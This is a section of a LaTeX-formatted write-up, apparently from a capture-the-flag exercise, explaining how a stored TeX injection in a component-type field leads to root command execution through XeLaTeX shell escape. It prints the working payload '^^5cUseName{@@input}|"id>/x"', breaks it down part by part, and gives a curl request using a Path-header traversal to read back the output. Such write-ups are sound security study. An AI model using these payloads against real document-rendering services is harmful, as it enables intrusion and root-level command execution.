% ============================================================
% 05 -- FROM TEX INJECTION TO RCE
% ============================================================

\section{From TeX Injection to Container-Root RCE}
\label{sec:rce}

At this point, attacker-controlled data could survive a trip through
MariaDB and later become TeX again.

The remaining question was:

\begin{center}
  \displayfont\large\bfseries
  can that TeX make XeLaTeX execute a shell command?
\end{center}

Because the service was running with \code{--shell-escape}, the answer
was yes.


% ------------------------------------------------------------
% 5.1
% ------------------------------------------------------------

\subsection{The Working Payload}

The compact payload that turned the component-type injection into command
execution was:

\begin{lstlisting}
^^5cUseName{@@input}|"id>/x"
\end{lstlisting}

At first glance this looks slightly cursed.

Broken into pieces, however, it is manageable:

\begin{center}
\begin{tabular}{p{0.31\textwidth} p{0.58\textwidth}}
  \toprule
  \textbf{Part} & \textbf{Purpose} \\
  \midrule

  \code{\^{}\^{}5c} &
  Produces the backslash character required to begin a TeX control
  sequence. \\[0.5em]

  \code{UseName\{@@input\}} &
  Resolves LaTeX's internal input primitive. \\[0.5em]

  \code{|"id>/x"} &
  Uses the shell-enabled pipe form of the input operation and runs the
  command \code{id>/x}. \\

  \bottomrule
\end{tabular}
\end{center}


% ------------------------------------------------------------
% 5.2
% ------------------------------------------------------------

\subsection{Why \texttt{@@input}?}

A normal TeX file include may look like:

\begin{lstlisting}
\input{file.tex}
\end{lstlisting}

During testing, the useful form was instead:

\begin{lstlisting}
\UseName{@@input}
\end{lstlisting}

This provided access to the internal input primitive used by LaTeX.

With shell escape enabled, the input mechanism also supports a pipe form:

\begin{lstlisting}
\UseName{@@input}|"command"
\end{lstlisting}

Instead of opening a normal file, XeLaTeX executes the supplied command.

The command's output can then be treated as input by TeX.

For exploitation, however, we did not actually need to consume the
command output inside the document.

Redirecting it into a file was much simpler.


% ------------------------------------------------------------
% 5.3
% ------------------------------------------------------------

\subsection{A Tiny Proof of Execution}

The initial proof used:

\begin{lstlisting}
id>/x
\end{lstlisting}

This resulted in the complete injected value:

\begin{lstlisting}
^^5cUseName{@@input}|"id>/x"
\end{lstlisting}

Once stored as the component type and rendered, the effective execution
path became:

\begin{center}
  \displayfont
  component type
  $\longrightarrow$
  \code{\textbackslash edef}
  $\longrightarrow$
  \code{\textbackslash UseName\{@@input\}}
  $\longrightarrow$
  shell command
\end{center}

The command itself wrote the result of \code{id} into:

\begin{lstlisting}
/x
\end{lstlisting}


% ------------------------------------------------------------
% 5.4
% ------------------------------------------------------------

\subsection{Getting the Output Back}

This is where the earlier \code{Path} vulnerability immediately became
useful again.

The result file could be retrieved with the existing file-read primitive:

\begin{lstlisting}
curl -g -6 --noproxy '*' \
  --path-as-is \
  -H 'Path: /../../x' \
  'http://[TARGET]:1337/'
\end{lstlisting}

The returned content showed that the command was executing as root inside
the LAMP service container:

\begin{lstlisting}
uid=0(root) gid=0(root) groups=0(root)
\end{lstlisting}

The chain had therefore reached:

\begin{center}
  \displayfont\large\bfseries
  container-root remote command execution
\end{center}


% ------------------------------------------------------------
% 5.5
% ------------------------------------------------------------

\subsection{The Chain So Far}

At this stage, the attack was already a complete RCE chain:

\begin{center}
\begin{tabular}{c}
  HTTP \code{typ} parameter \\[0.3em]
  $\downarrow$ \\[0.3em]
  stored in MariaDB \\[0.3em]
  $\downarrow$ \\[0.3em]
  reconstructed through \code{\textbackslash edef} \\[0.3em]
  $\downarrow$ \\[0.3em]
  \code{\^{}\^{}5c} becomes \code{\textbackslash} \\[0.3em]
  $\downarrow$ \\[0.3em]
  \code{\textbackslash UseName\{@@input\}} \\[0.3em]
  $\downarrow$ \\[0.3em]
  shell escape \\[0.3em]
  $\downarrow$ \\[0.3em]
  command output written to a file \\[0.3em]
  $\downarrow$ \\[0.3em]
  \code{Path:} traversal retrieves the result
\end{tabular}
\end{center}

\begin{findingbox}
The \code{typ} parameter was sufficient to turn stored application data
into operating-system command execution.

Because XeLaTeX ran as root inside the service container, the resulting
commands also executed as root inside that container.
\end{findingbox}


% ------------------------------------------------------------
% 5.6
% ------------------------------------------------------------

\subsection{Unfortunately, 32 Bytes}

There was one fairly significant problem.

The component type was not an unlimited string.

The MariaDB field only gave us a very small payload budget.

Simple commands such as:

\begin{lstlisting}
id>/x
\end{lstlisting}

fit comfortably.

A useful flag-harvesting command did not.

A reverse shell, a longer filesystem search, or even a convenient
multi-stage command quickly exceeded the available space.

So although we technically had root command execution, it initially
looked like this:

\begin{center}
  \displayfont\bfseries
  root RCE, but make it tiny.
\end{center}

The next problem was therefore not finding another execution primitive.

It was finding somewhere else to store the command.